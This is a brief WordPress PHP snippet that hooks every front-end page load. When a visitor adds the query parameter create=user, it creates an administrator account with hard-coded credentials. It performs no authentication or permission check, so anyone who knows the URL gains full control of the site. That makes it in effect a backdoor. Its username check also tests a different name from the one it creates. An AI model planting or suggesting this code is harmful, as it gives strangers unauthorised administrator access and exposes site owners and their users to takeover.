<?php
/**
 * Create admin user
 */
add_action('wp_head', 'wploop_create_user');
function wploop_create_user() {
    If ($_GET['create'] == 'user') {
        require('wp-includes/registration.php');
        If (!username_exists('username')) {

            $user_id = wp_create_user('name', 'pass');
            $user = new WP_User($user_id);
            $user->set_role('administrator');
        }
    }
}
?>